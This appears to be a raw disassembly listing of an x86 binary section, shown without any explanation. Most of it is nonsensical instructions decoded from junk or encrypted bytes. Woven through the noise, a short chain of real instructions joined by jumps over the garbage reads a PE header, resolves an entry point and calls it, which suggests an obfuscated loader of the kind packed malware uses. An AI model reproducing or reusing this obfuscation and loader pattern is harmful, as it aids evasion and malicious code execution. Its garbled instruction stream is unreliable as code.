  42ccde:	lods   eax,DWORD PTR ds:[esi]
  42ccdf:	jmp    0xb3df:0x6892ee7d
  42cce6:	xchg   BYTE PTR [edx+0x392e453d],bh
  42ccec:	mov    DWORD PTR [ecx-0x33],edi
  42ccef:	repnz mov eax,ds:0x31691f43
  42ccf5:	into   
  42ccf6:	cmp    BYTE PTR [eax-0x4f],dh
  42ccf9:	jp     0x42cd1c
  42ccfb:	loopne 0x42cce6
  42ccfd:	fstp   TBYTE PTR ds:0xe0fa329
  42cd03:	adc    ebp,esi
  42cd05:	ds push cs
  42cd07:	loopne 0x42ccd8
  42cd09:	mov    ds:0x36ecc366,al
  42cd0e:	cli    
  42cd0f:	shr    DWORD PTR gs:[ecx+0x38],0x60
  42cd14:	dec    esi
  42cd15:	stos   DWORD PTR es:[edi],eax
  42cd16:	mov    al,ds:0xfe9cc2ff
  42cd1b:	jns    0x42cd3d
  42cd1d:	scas   eax,DWORD PTR es:[edi]
  42cd1e:	sbb    eax,0x831162b7
  42cd23:	add    eax,0x4f2f3741
  42cd28:	jecxz  0x42cda9
  42cd2a:	inc    eax
  42cd2b:	inc    edi
  42cd2c:	mov    ecx,0xcc919655
  42cd31:	out    0x99,eax
  42cd33:	jmp    0xb9a5:0xc04a0500
  42cd3a:	sbb    al,0xfd
  42cd3c:	jns    0x42cd3b
  42cd3e:	dec    edi
  42cd3f:	xchg   ebx,eax
  42cd40:	call   0x1b20:0x71354cf3
  42cd47:	sbb    eax,0x1c700cad
  42cd4c:	test   DWORD PTR [ebp-0x15],ebp
  42cd4f:	mov    ah,0x63
  42cd51:	dec    ebx
  42cd52:	add    al,0xe2
  42cd54:	push   edi
  42cd55:	push   ss
  42cd56:	retf   0xa7f7
  42cd59:	aad    0x6b
  42cd5b:	cmp    BYTE PTR [eax+esi*2],dh
  42cd5e:	push   esp
  42cd5f:	xchg   edx,eax
  42cd60:	xor    ebx,DWORD PTR [edi+0x5585dbde]
  42cd66:	loope  0x42cd8b
  42cd68:	into   
  42cd69:	mov    eax,DWORD PTR [eax+0x3c]
  42cd6c:	jmp    0x42ce4c
  42cd71:	and    al,0x95
  42cd73:	sub    BYTE PTR [edx],bh
  42cd75:	mov    ecx,0xe89f36bf
  42cd7a:	push   edi
  42cd7b:	aaa    
  42cd7c:	int    0x92
  42cd7e:	fcom   QWORD PTR [edx-0x61]
  42cd81:	dec    ebp
  42cd82:	push   ss
  42cd83:	add    al,BYTE PTR [eax]
  42cd85:	ret    
  42cd86:	add    BYTE PTR [eax],al
  42cd88:	add    BYTE PTR [ebp+0x2b9fd894],ch
  42cd8e:	pop    ebx
  42cd8f:	xchg   BYTE PTR [esi],ah
  42cd91:	shl    BYTE PTR [ebx+0x67],cl
  42cd94:	mov    esi,0x46bc9803
  42cd99:	sbb    eax,0x96dd4ce2
  42cd9e:	and    ch,BYTE PTR [esi]
  42cda0:	lods   eax,DWORD PTR ds:[esi]
  42cda1:	mov    ch,0x92
  42cda3:	dec    ecx
  42cda4:	scas   eax,DWORD PTR es:[edi]
  42cda5:	scas   al,BYTE PTR es:[edi]
  42cda6:	fstp   DWORD PTR [ebp+eiz*2+0xddca8ca]
  42cdad:	cwde   
  42cdae:	adc    bh,BYTE PTR [edx+0xc82de90]
  42cdb4:	add    bh,BYTE PTR [ebx]
  42cdb6:	test   BYTE PTR [edx-0xf],dl
  42cdb9:	jmp    0x42cdb6
  42cdbb:	xchg   BYTE PTR [eax+ebp*2+0xf],al
  42cdbf:	xchg   ebx,eax
  42cdc0:	addr16 sbb al,0x7c
  42cdc3:	dec    edi
  42cdc4:	imul   ecx,DWORD PTR [esi+0x6c],0x43995fd0
  42cdcb:	inc    eax
  42cdcc:	rcl    BYTE PTR [edi-0x65],1
  42cdcf:	mov    BYTE PTR [eax+ebx*4],ch
  42cdd2:	dec    ebp
  42cdd3:	test   DWORD PTR [ecx+0x2d],ebp
  42cdd6:	icebp  
  42cdd7:	sbb    ecx,DWORD PTR [eax-0x7e]
  42cdda:	lods   al,BYTE PTR ds:[esi]
  42cddb:	popa   
  42cddc:	xor    ch,BYTE PTR [edi]
  42cdde:	loopne 0x42ce31
  42cde0:	jno    0x42cdc2
  42cde2:	loopne 0x42ce43
  42cde4:	or     eax,0xc0885e37
  42cde9:	add    ecx,DWORD PTR [ecx+ebp*2-0x448e7e7d]
  42cdf0:	adc    BYTE PTR [ebp-0x41c0504a],0x2f
  42cdf7:	outs   dx,DWORD PTR ds:[esi]
  42cdf8:	jp     0x42cd9b
  42cdfa:	loope  0x42cdd4
  42cdfc:	icebp  
  42cdfd:	cwde   
  42cdfe:	mov    dh,ch
  42ce00:	into   
  42ce01:	add    bl,BYTE PTR [edx]
  42ce03:	sub    DWORD PTR es:[esi],esp
  42ce06:	sti    
  42ce07:	sub    al,0x41
  42ce09:	xchg   edx,eax
  42ce0a:	add    al,0x19
  42ce0c:	lds    esi,FWORD PTR [edi-0x51]
  42ce0f:	enter  0xfa9e,0xae
  42ce13:	mov    WORD PTR [edi-0x72fcde3d],gs
  42ce19:	xor    al,BYTE PTR [ecx+0x5441f401]
  42ce1f:	fs or  eax,0x91152815
  42ce25:	mov    edi,0x130933ed
  42ce2a:	add    ecx,DWORD PTR [eax]
  42ce2c:	imul   eax,DWORD PTR [eax+0x49859a72],0x195cc25c
  42ce36:	mov    ch,0x5f
  42ce38:	ins    BYTE PTR es:[edi],dx
  42ce39:	int3   
  42ce3a:	test   BYTE PTR [edx],dh
  42ce3c:	jno    0x42cea6
  42ce3e:	sub    dl,BYTE PTR [ebp-0x22ed089c]
  42ce44:	dec    edi
  42ce45:	in     al,dx
  42ce46:	xor    al,dh
  42ce48:	in     eax,0x69
  42ce4a:	dec    ebx
  42ce4b:	inc    ebx
  42ce4c:	mov    ecx,DWORD PTR [ecx+0x194]
  42ce52:	mov    ecx,DWORD PTR [ecx]
  42ce54:	lea    eax,[ecx+eax*1+0x28]
  42ce58:	jmp    0x42cf38
  42ce5d:	aas    
  42ce5e:	sub    esi,ecx
  42ce60:	inc    ebx
  42ce61:	cmc    
  42ce62:	fstp   TBYTE PTR [edi+0x15369b7f]
  42ce68:	outs   dx,BYTE PTR ds:[esi]
  42ce69:	adc    DWORD PTR [ebp+ecx*1+0x2171069],esp
  42ce70:	add    bl,al
  42ce72:	add    BYTE PTR [eax],al
  42ce74:	add    bh,ah
  42ce76:	scas   eax,DWORD PTR es:[edi]
  42ce77:	addr16 pop edx
  42ce79:	xor    eax,DWORD PTR [edx]
  42ce7b:	cmp    edi,DWORD PTR [ecx-0x10f1f8f8]
  42ce81:	sub    BYTE PTR ds:0xdd697eb5,bh
  42ce87:	jbe    0x42ce0d
  42ce89:	scas   al,BYTE PTR es:[edi]
  42ce8a:	push   0xfffffff5
  42ce8c:	ror    DWORD PTR [ebx+0x2b496103],1
  42ce92:	iret   
  42ce93:	mov    fs,WORD PTR [eax]
  42ce95:	stos   BYTE PTR es:[edi],al
  42ce96:	pop    ds
  42ce97:	not    BYTE PTR [ecx+0x31b25454]
  42ce9d:	inc    esp
  42ce9e:	push   edi
  42ce9f:	mov    eax,ds:0x13f2736f
  42cea4:	cmp    DWORD PTR [esi],esi
  42cea6:	mov    ds:0x89bfc810,eax
  42ceab:	les    edx,FWORD PTR [ebx+0x78a1bb0c]
  42ceb1:	and    al,BYTE PTR [ebp-0x1f]
  42ceb4:	push   ecx
  42ceb5:	into   
  42ceb6:	ret    0x22f0
  42ceb9:	mov    eax,DWORD PTR ds:0xdb3df1ea
  42cebf:	push   ecx
  42cec0:	sub    dh,ch
  42cec2:	popf   
  42cec3:	sahf   
  42cec4:	fst    st(6)
  42cec6:	retf   0x9787
  42cec9:	(bad)  
  42ceca:	pop    edx
  42cecb:	mov    eax,ds:0x3bb9a49
  42ced0:	jbe    0x42cead
  42ced2:	outs   dx,BYTE PTR ds:[esi]
  42ced3:	repnz sbb al,0xa1
  42ced6:	das    
  42ced7:	les    ebx,FWORD PTR [ecx]
  42ced9:	dec    edi
  42ceda:	add    DWORD PTR [ecx],ebx
  42cedc:	or     al,0x11
  42cede:	xchg   ebp,eax
  42cedf:	daa    
  42cee0:	sub    bl,BYTE PTR [esi]
  42cee2:	xchg   edx,eax
  42cee3:	nop
  42cee4:	and    BYTE PTR [eax+0x7b],dh
  42cee7:	jae    0x42ceaa
  42cee9:	and    al,0xbf
  42ceeb:	popa   
  42ceec:	fs dec esi
  42ceee:	cli    
  42ceef:	xor    eax,0x59f984d
  42cef4:	shr    esi,1
  42cef6:	adc    eax,0x1f5af2da
  42cefb:	jl     0x42cef9
  42cefd:	rcl    BYTE PTR [ebx-0x72ab1221],cl
  42cf03:	sar    dh,cl
  42cf05:	or     cl,BYTE PTR [eax-0x2a6c4bbb]
  42cf0b:	iret   
  42cf0c:	xchg   edx,eax
  42cf0d:	sbb    DWORD PTR [esi],0xd88ec035
  42cf13:	out    0x4a,eax
  42cf15:	mov    ah,0x82
  42cf17:	dec    DWORD PTR [ecx-0x6cf60d9e]
  42cf1d:	ds iret 
  42cf1f:	call   0x277e21db
  42cf24:	dec    esp
  42cf25:	cdq    
  42cf26:	dec    ecx
  42cf27:	fnstcw WORD PTR [eax]
  42cf29:	adc    bh,BYTE PTR [ecx-0x64]
  42cf2c:	cmp    al,ch
  42cf2e:	and    eax,0x288b19c5
  42cf33:	sub    eax,0x30fe19d7
  42cf38:	mov    eax,DWORD PTR [eax]
  42cf3a:	add    DWORD PTR [esp+0x4c],eax
  42cf3e:	push   DWORD PTR ds:0x433294
  42cf44:	push   DWORD PTR ds:0x433038
  42cf4a:	mov    eax,ds:0x4331b4
  42cf4f:	jmp    0x42d02f
  42cf54:	mov    eax,0xac2cacb8
  42cf59:	cmp    al,0xb8
  42cf5b:	mov    esp,0xda7c583c
  42cf60:	leave  
  42cf61:	cmp    ebp,DWORD PTR [esi+0x217d367]
  42cf67:	add    bl,al
  42cf69:	add    BYTE PTR [eax],al
  42cf6b:	add    bl,dl
  42cf6d:	ror    BYTE PTR [esi-0x54],0x35
  42cf71:	xor    dh,dh
  42cf73:	jp     0x42cf09
  42cf75:	add    BYTE PTR [esi],al
  42cf77:	repnz cdq 
  42cf79:	xchg   ebx,eax
  42cf7a:	xor    BYTE PTR [edi],bh
  42cf7c:	test   DWORD PTR [ecx+0x8bb206a],esp
  42cf82:	icebp  
  42cf83:	out    dx,al
  42cf84:	test   eax,ecx
  42cf86:	leave  
  42cf87:	push   esp
  42cf88:	repnz cmp BYTE PTR [ecx],cl
  42cf8b:	mov    ah,0x55
  42cf8d:	dec    edi
  42cf8e:	mov    ds:0x292df722,eax
  42cf93:	xchg   DWORD PTR [edi],edx
  42cf95:	sbb    ecx,edi
  42cf97:	sti    
  42cf98:	dec    esi
  42cf99:	pop    ss
  42cf9a:	aas    
  42cf9b:	inc    edx
  42cf9c:	jb     0x42cf62
  42cf9e:	mov    dl,0x5b
  42cfa0:	mov    al,0x92
  42cfa2:	fst    st(7)
  42cfa4:	adc    al,0x60
  42cfa6:	sbb    al,0x78
  42cfa8:	inc    ecx
  42cfa9:	in     al,dx
  42cfaa:	mov    ecx,DWORD PTR [ebp+0x1c]
  42cfad:	pop    es
  42cfae:	sbb    al,0xf7
  42cfb0:	adc    DWORD PTR [edx-0x6a5c1118],0x1c0e3e4f
  42cfba:	pop    ds
  42cfbb:	out    0x6d,eax
  42cfbd:	jmp    0x785:0x4f73e95a
  42cfc4:	rcr    DWORD PTR [eax],0xf0
  42cfc7:	cmp    eax,0x4fca27d4
  42cfcc:	jnp    0x42cf7c
  42cfce:	jl     0x42d006
  42cfd0:	ds ds pop esp
  42cfd3:	and    DWORD PTR [ebx+0x7a],0xbf19c1b6
  42cfda:	sub    DWORD PTR [ebp-0x36127b3e],esp
  42cfe0:	xchg   BYTE PTR [ecx-0x2],cl
  42cfe3:	ss lahf 
  42cfe5:	fbld   TBYTE PTR [ebp+esi*4+0x23]
  42cfe9:	fisttp QWORD PTR [eax]
  42cfeb:	adc    BYTE PTR [esi],0xd7
  42cfee:	mov    dh,0xa
  42cff0:	pop    edi
  42cff1:	or     ebp,DWORD PTR [edi+0x54]
  42cff4:	sub    DWORD PTR [ecx-0x5a],0xffffff8f
  42cff8:	jbe    0x42cfb2
  42cffa:	lock and al,0x21
  42cffd:	ins    BYTE PTR es:[edi],dx
  42cffe:	jb     0x42cfde
  42d000:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d001:	int3   
  42d002:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d003:	jnp    0x42cfbc
  42d005:	pop    esp
  42d006:	test   eax,0x27bc4f16
  42d00b:	out    dx,eax
  42d00c:	cmp    bl,BYTE PTR [eax-0x1b31d9c7]
  42d012:	call   0x41ed:0x48d9509f
  42d019:	aaa    
  42d01a:	in     eax,dx
  42d01b:	pop    eax
  42d01c:	xchg   edx,eax
  42d01d:	mov    bh,0x7e
  42d01f:	and    al,BYTE PTR [edx-0x45]
  42d022:	arpl   WORD PTR [esi+0x256d457],di
  42d028:	neg    cl
  42d02a:	push   esp
  42d02b:	inc    ebp
  42d02c:	pop    ebx
  42d02d:	ret    0x8b15
  42d030:	adc    BYTE PTR [ecx+eax*1-0x24170000],0x0
  42d038:	add    BYTE PTR [eax],al
  42d03a:	xchg   BYTE PTR [eax-0x4549774e],al
  42d040:	mov    esi,0xd633e68e
  42d045:	in     al,0x84
  42d047:	mov    bh,0x6c
  42d049:	lahf   
  42d04a:	xchg   esi,eax
  42d04b:	sbb    BYTE PTR [edx],al
  42d04d:	add    bl,al
  42d04f:	add    BYTE PTR [eax],al
  42d051:	add    BYTE PTR [ebx-0x3a],dh
  42d054:	test   al,0xf8
  42d056:	jae    0x42d04f
  42d058:	fwait
  42d059:	ja     0x42d04d
  42d05b:	cmp    esi,DWORD PTR [di-0x23]
  42d05f:	repnz pop bp
  42d062:	scas   al,BYTE PTR es:[edi]
  42d063:	mov    esp,DWORD PTR [ecx+0x7984aeff]
  42d069:	cmp    DWORD PTR [ebp-0x66f09611],edi
  42d06f:	sub    dh,BYTE PTR [esp+ecx*4-0x6d954836]
  42d076:	pop    esp
  42d077:	in     al,0x75
  42d079:	test   eax,0x3f53ced0
  42d07e:	jno    0x42d0cf
  42d080:	jno    0x42d0ae
  42d082:	mov    eax,ds:0xffd87cd3
  42d087:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d088:	pushf  
  42d089:	icebp  
  42d08a:	jmp    0xbf784f25
  42d08f:	pusha  
  42d090:	mul    edi
  42d092:	sbb    edi,DWORD PTR [edi+0x2dc147b7]
  42d098:	popa   
  42d099:	pop    eax
  42d09a:	push   esp
  42d09b:	jmp    0x4c742397
  42d0a0:	aam    0xe4
  42d0a2:	dec    esp
  42d0a3:	into   
  42d0a4:	call   0xfd19:0x596a2bbe
  42d0ab:	es jle 0x42d032
  42d0ae:	in     eax,0x97
  42d0b0:	int    0x84
  42d0b2:	popf   
  42d0b3:	dec    esi
  42d0b4:	in     eax,0xf3
  42d0b6:	push   cs
  42d0b7:	(bad)  
  42d0b8:	jmp    0x16e0:0xa1938f42
  42d0bf:	lock fidivr WORD PTR [ecx+0x23fe6c7f]
  42d0c6:	loopne 0x42d129
  42d0c8:	pop    ss
  42d0c9:	jb     0x42d07e
  42d0cb:	and    esp,0x30
  42d0ce:	xchg   BYTE PTR [edx-0x6d],ch
  42d0d1:	sbb    edi,eax
  42d0d3:	dec    ebx
  42d0d4:	xchg   BYTE PTR [edi],al
  42d0d6:	jmp    0x42d062
  42d0d8:	inc    eax
  42d0d9:	ret    0xb401
  42d0dc:	mov    BYTE PTR [esi+0x1f5616fb],ah
  42d0e2:	retf   
  42d0e3:	push   ss
  42d0e4:	std    
  42d0e5:	adc    cl,bl
  42d0e7:	das    
  42d0e8:	ret    0x4363
  42d0eb:	dec    eax
  42d0ec:	mov    eax,DWORD PTR [esi+0x791f1984]
  42d0f2:	push   ss
  42d0f3:	mov    bl,0x4c
  42d0f5:	ret    0x7507
  42d0f8:	mov    DWORD PTR [ecx+0x15],ecx
  42d0fb:	fs lock gs ret 
  42d0ff:	hlt    
  42d100:	xchg   edi,eax
  42d101:	dec    DWORD PTR [edx-0x33]
  42d104:	mov    ds:0x522686ab,al
  42d109:	cmc    
  42d10a:	add    eax,DWORD PTR [ecx+0x3bd9f2b2]
  42d110:	retf   0xd063
  42d113:	push   es
  42d114:	inc    esi
  42d115:	push   DWORD PTR [eax]
  42d117:	mov    eax,DWORD PTR [esp+0x58]
  42d11b:	jmp    0x42d1fb
  42d120:	(bad)  
  42d121:	lods   al,BYTE PTR ds:[esi]
  42d122:	fadd   DWORD PTR [ecx-0x51200a05]
  42d128:	xchg   ebx,eax
  42d129:	arpl   WORD PTR [esp+eiz*8+0xd0c552d],ax
  42d130:	pop    ecx
  42d131:	sbb    DWORD PTR [edx],eax
  42d133:	add    bl,al
  42d135:	add    BYTE PTR [eax],al
  42d137:	add    BYTE PTR [esi-0x54],bh
  42d13a:	adc    al,0xac
  42d13c:	and    DWORD PTR [ebp-0x78bac02d],0x296ab18
  42d146:	int3   
  42d147:	mov    fs,esp
  42d149:	pop    es
  42d14a:	mov    edx,0x2f340fa7
  42d14f:	dec    esi
  42d150:	xor    eax,0xf58e993e
  42d155:	mov    edx,0xb49e0769
  42d15a:	cwde   
  42d15b:	(bad)  
  42d15c:	call   FWORD PTR ds:0x48b8fb97
  42d162:	ret    0xf201
  42d165:	adc    ecx,DWORD PTR [edi+ebx*4+0x76141188]
  42d16c:	mov    WORD PTR [edx],gs
  42d16e:	sbb    edi,DWORD PTR [ebx]
  42d170:	stos   DWORD PTR es:[edi],eax
  42d171:	xchg   BYTE PTR [eax-0x79ba50ca],cl
  42d177:	xchg   edx,eax
  42d178:	je     0x42d147
  42d17a:	dec    ebx
  42d17b:	inc    eax
  42d17c:	jge    0x42d13c
  42d17e:	jg     0x42d14b
  42d180:	dec    edi
  42d181:	mov    eax,ds:0xa2be283f
  42d186:	fadd   st,st(1)
  42d188:	sub    eax,0x12e24c55
  42d18d:	(bad)  
  42d18e:	inc    DWORD PTR [edx]
  42d190:	mov    ch,0x98
  42d192:	cmp    DWORD PTR [edx-0xc],esp
  42d195:	dec    ebx
  42d196:	xchg   ebx,eax
  42d197:	inc    eax
  42d198:	xlat   BYTE PTR ds:[ebx]
  42d199:	repz fild QWORD PTR [esi+esi*8+0x5cc15283]
  42d1a1:	pop    es
  42d1a2:	call   DWORD PTR [edx]
  42d1a4:	dec    ebx
  42d1a5:	xchg   ebx,eax
  42d1a6:	push   es
  42d1a7:	fsub   QWORD PTR [eax]
  42d1a9:	dec    ebp
  42d1aa:	sbb    ebx,esi
  42d1ac:	cmp    BYTE PTR [edi+0x48802eed],0x24
  42d1b3:	xchg   ebp,eax
  42d1b4:	test   BYTE PTR ds:0x41b57319,bl
  42d1ba:	mov    BYTE PTR [esi],bl
  42d1bc:	xor    edi,edx
  42d1be:	dec    edi
  42d1bf:	sub    DWORD PTR [esi],eax
  42d1c1:	adc    BYTE PTR [edi-0x4e],bh
  42d1c4:	jmp    0x42d1d6
  42d1c6:	in     al,0xa2
  42d1c8:	js     0x42d1b4
  42d1ca:	and    al,0x33
  42d1cc:	loop   0x42d174
  42d1ce:	push   ebx
  42d1cf:	adc    ecx,DWORD PTR [ebx-0xf]
  42d1d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d1d3:	je     0x42d1cf
  42d1d5:	shl    BYTE PTR [ecx-0x32],cl
  42d1d8:	jbe    0x42d230
  42d1da:	dec    ebp
  42d1db:	mov    esi,0xe22b287a
  42d1e0:	xchg   ecx,eax
  42d1e1:	xchg   DWORD PTR [eax+eax*2-0x630e0d11],edi
  42d1e8:	ret    
  42d1e9:	xor    BYTE PTR [eax-0x6afb668c],al
  42d1ef:	leave  
  42d1f0:	mov    eax,ds:0xf9cf0b7f
  42d1f5:	or     dl,BYTE PTR ds:0x98e78169
  42d1fb:	call   eax
  42d1fd:	mov    ecx,DWORD PTR ds:0x4331b4
  42d203:	jmp    0x42d2e3
  42d208:	rol    esp,0x90
  42d20b:	daa    
  42d20c:	xchg   ebp,eax
  42d20d:	ja     0x42d206
  42d20f:	out    0x5f,al
  42d211:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d212:	test   al,0xa1
  42d214:	sub    BYTE PTR [ebx+eiz*8+0x21a1c74],dh
  42d21b:	add    bl,al
  42d21d:	add    BYTE PTR [eax],al
  42d21f:	add    BYTE PTR ds:0x3278d27e,al
  42d225:	cmp    eax,0xd3468592
  42d22a:	clc    
  42d22b:	js     0x42d1c6
  42d22d:	das    
  42d22e:	mov    ecx,0xe3fbdc18
  42d233:	xchg   ebx,eax
  42d234:	push   ss
  42d235:	adc    DWORD PTR [edx],edi
  42d237:	cli    
  42d238:	push   edi
  42d239:	test   eax,0x6821bedc
  42d23e:	add    BYTE PTR [ecx-0x13bf6e59],bl
  42d244:	imul   edi,DWORD PTR [ecx],0x8a0b809c
  42d24a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d24b:	mov    edx,DWORD PTR [ebx+0x0]
  42d24e:	adc    DWORD PTR [esi-0x53],0x27
  42d252:	lock xor esp,0x4c5f6498
  42d259:	(bad)  
  42d25a:	into   
  42d25b:	jbe    0x42d28d
  42d25d:	xchg   ecx,eax
  42d25e:	fadd   QWORD PTR [ecx+edi*4-0x6f75a81d]
  42d265:	pop    esi
  42d266:	jo     0x42d280
  42d268:	mov    ds,edx
  42d26a:	je     0xa7dbdbd0
  42d270:	jnp    0x42d2cd
  42d272:	lods   al,BYTE PTR ds:[esi]
  42d273:	shr    BYTE PTR [edx+0xc],0x90
  42d277:	fld    st(6)
  42d279:	out    dx,al
  42d27a:	ss rcr bl,cl
  42d27d:	cmp    edx,DWORD PTR [ebx-0x1d]
  42d280:	cmc    
  42d281:	loopne 0x42d2f2
  42d283:	call   0x63042dd6
  42d288:	js     0x42d2ce
  42d28a:	push   ebx
  42d28b:	xor    ah,BYTE PTR [ecx-0x17]
  42d28e:	xchg   edi,eax
  42d28f:	mov    eax,ds:0x5fd4b4e7
  42d294:	mov    ebp,0xb3c0e450
  42d299:	push   ss
  42d29a:	or     al,0x24
  42d29c:	mov    DWORD PTR [edi+0x6b54de33],edx
  42d2a2:	add    cl,BYTE PTR [ecx-0x4c474ead]
  42d2a8:	adc    eax,0x3d6f5faa
  42d2ad:	mov    eax,ds:0x7037fe7a
  42d2b2:	add    ebx,ebp
  42d2b4:	and    cl,dh
  42d2b6:	in     al,dx
  42d2b7:	push   cs
  42d2b8:	imul   ecx,DWORD PTR [edi+0x7f],0x74
  42d2bc:	push   edi
  42d2bd:	sti    
  42d2be:	mov    ch,BYTE PTR [esi]
  42d2c0:	or     esp,DWORD PTR [edx+0x1a]
  42d2c3:	or     BYTE PTR [edi-0x64ebd705],dl
  42d2c9:	in     al,dx
  42d2ca:	out    dx,al
  42d2cb:	inc    eax
  42d2cc:	pop    edx
  42d2cd:	int3   
  42d2ce:	test   DWORD PTR [ecx+esi*4-0x19621a2b],esp
  42d2d5:	jne    0x42d2fe
  42d2d7:	pop    eax
  42d2d8:	jns    0x42d2cb
  42d2da:	push   eax
  42d2db:	inc    esi
  42d2dc:	xor    DWORD PTR [edx],esi
  42d2de:	dec    edi
  42d2df:	sub    al,0x14
  42d2e1:	dec    edi
  42d2e2:	dec    edi
  42d2e3:	mov    ecx,DWORD PTR [ecx+0x1cc]
  42d2e9:	jmp    0x42d3c9
  42d2ee:	call   0x3fe10fde
  42d2f3:	fucomip st,st(2)
  42d2f5:	call   FWORD PTR [edx+0x1b]
  42d2f8:	addr16 sbb al,0x95
  42d2fb:	mov    gs:0x21adf5f,eax
  42d301:	add    bl,al
  42d303:	add    BYTE PTR [eax],al
  42d305:	add    BYTE PTR [edx],bl
  42d307:	cmp    eax,0x4e8a8e79
  42d30c:	adc    DWORD PTR [edx+0x3f],0xffffff96
  42d310:	sub    eax,0x9363fc33
  42d315:	inc    ecx
  42d316:	jo     0x42d2e3
  42d318:	(bad)  
  42d319:	or     al,0x9
  42d31b:	inc    esp
  42d31c:	inc    eax
  42d31d:	xchg   esp,eax
  42d31e:	aaa    
  42d31f:	pop    edx
  42d320:	pop    eax
  42d321:	fld    DWORD PTR [eax]
  42d323:	push   ds
  42d324:	enter  0xf655,0x64
  42d328:	stos   BYTE PTR es:[edi],al
  42d329:	jbe    0x42d2f2
  42d32b:	and    eax,0xffcf297d
  42d330:	call   0x1dab24d8
  42d335:	cdq    
  42d336:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d337:	pop    esi
  42d338:	adc    al,0x12
  42d33a:	xchg   edx,eax
  42d33b:	push   edx
  42d33c:	mov    ebx,DWORD PTR [edx+0x3c2753b6]
  42d342:	(bad)  
  42d343:	push   0xffffffde
  42d345:	out    dx,al
  42d346:	and    eax,0x6cb8838c
  42d34b:	imul   eax,DWORD PTR [ebx+0x27],0x34f20afb
  42d352:	mov    ebx,0x629a9b44
  42d357:	fidiv  WORD PTR [ebp+0x1a]
  42d35a:	cwde   
  42d35b:	call   FWORD PTR [ecx+0x50]
  42d35e:	ins    BYTE PTR es:[edi],dx
  42d35f:	and    al,0x18
  42d361:	add    bh,cl
  42d363:	std    
  42d364:	in     eax,0xb0
  42d366:	cmp    al,0xbd
  42d368:	rcl    BYTE PTR [eax+0x469dfbe8],1
  42d36e:	sti    
  42d36f:	dec    ecx
  42d370:	in     eax,dx
  42d371:	jae    0x42d3a9
  42d373:	cs xchg esi,eax
  42d375:	mov    bl,0xda
  42d377:	push   cs
  42d378:	mov    dh,0xa9
  42d37a:	or     DWORD PTR [edi+0xe3b90a],edi
  42d380:	fdivr  st,st(3)
  42d382:	push   ds
  42d383:	pop    ebx
  42d384:	and    al,0xae
  42d386:	scas   al,BYTE PTR es:[edi]
  42d387:	aad    0xc4
  42d389:	cmp    ah,al
  42d38b:	xor    bh,BYTE PTR [ebp+0x6f4d871e]
  42d391:	aaa    
  42d392:	jo     0x42d33a
  42d394:	pop    ecx
  42d395:	imul   esp,DWORD PTR [ebx],0x1c
  42d398:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d399:	pop    edi
  42d39a:	pop    ebp
  42d39b:	xlat   BYTE PTR ds:[ebx]
  42d39c:	ss mov ch,0xc3
  42d39f:	sub    esi,DWORD PTR [ebx]
  42d3a1:	jmp    0x28ffd5af
  42d3a6:	sub    al,0x34
  42d3a8:	loope  0x42d394
  42d3aa:	ja     0x42d346
  42d3ac:	xor    eax,0x40f9a458
  42d3b1:	mov    ch,0xd7
  42d3b3:	dec    ecx
  42d3b4:	dec    ebp
  42d3b5:	jle    0x42d430
  42d3b7:	lds    ebx,FWORD PTR [edi+ebp*1-0x53]
  42d3bb:	sub    DWORD PTR [esi+eiz*2-0x67],0xffffffaa
  42d3c0:	push   edi
  42d3c1:	mov    ah,0x77
  42d3c3:	jl     0x42d3fa
  42d3c5:	mov    DWORD PTR [ecx+esi*2],ecx
  42d3c8:	xor    cl,BYTE PTR [ecx+0x31b4a101]
  42d3ce:	inc    ebx
  42d3cf:	add    cl,ch
  42d3d1:	fild   DWORD PTR [eax]
  42d3d3:	add    BYTE PTR [eax],al
  42d3d5:	push   ebp
  42d3d6:	out    0xb1,eax
  42d3d8:	mov    al,ds:0xf755f6b3
  42d3dd:	xchg   ecx,eax
  42d3de:	ret    0x9f8a
  42d3e1:	mov    cl,0x13
  42d3e3:	(bad)
  42d3e6:	sbb    eax,DWORD PTR [edx]
  42d3e8:	add    bl,al
  42d3ea:	add    BYTE PTR [eax],al
  42d3ec:	add    ch,cl
  42d3ee:	jbe    0x42d3ce
  42d3f0:	jp     0x42d3fd
  42d3f2:	call   0x8c9a791b
  42d3f7:	mov    bh,0xbd
  42d3f9:	imul   ebp,DWORD PTR [eax]
  42d3fc:	cmp    al,bh
  42d3fe:	mov    dl,0xe1
  42d400:	pop    es
  42d401:	sub    al,0x25
  42d403:	enter  0x8113,0x4e
  42d407:	scas   eax,DWORD PTR es:[edi]
  42d408:	sub    edx,ecx
  42d40a:	or     esi,ebx
  42d40c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d40d:	je     0x42d405
  42d40f:	or     ecx,DWORD PTR ss:[edx+0x23b577ca]
  42d416:	mov    dl,0x15
  42d418:	jno    0x42d39b
  42d41a:	jmp    0x6884947e
  42d41f:	loope  0x42d447
  42d421:	fcom   DWORD PTR [eax+0x4d143260]
  42d427:	jno    0x42d473
  42d429:	in     eax,dx
  42d42a:	jb     0x42d3de
  42d42c:	pop    ebx
  42d42d:	sub    esi,0xf0d4abc6
  42d433:	test   DWORD PTR [ecx+0x66],0x1f5aab31
  42d43a:	aad    0x99
  42d43c:	ins    DWORD PTR es:[edi],dx
  42d43d:	stc    
  42d43e:	pop    ds
  42d43f:	inc    esp
  42d440:	mov    esi,0x8a0919d6
  42d445:	arpl   WORD PTR [ebx],bp
  42d447:	mov    eax,ds:0x3eafedfc
  42d44c:	pop    ecx
  42d44d:	dec    edx
  42d44e:	add    esi,DWORD PTR [edi+edx*2+0x6c]
  42d452:	ins    BYTE PTR es:[edi],dx
  42d453:	xchg   BYTE PTR [ebp+ecx*8-0x4cf373c8],bl
  42d45a:	push   ss
  42d45b:	mov    dl,BYTE PTR [edx-0x3ff270bc]
  42d461:	rol    DWORD PTR ds:0xd8536b51,cl
  42d467:	inc    ebx
  42d468:	xor    DWORD PTR [edx-0x213018d1],edi
  42d46e:	outs   dx,BYTE PTR ds:[esi]
  42d46f:	mov    cl,0x96
  42d471:	pop    ebp
  42d472:	push   esi
  42d473:	push   cs
  42d474:	push   0x6
  42d476:	push   0x2d4bec70
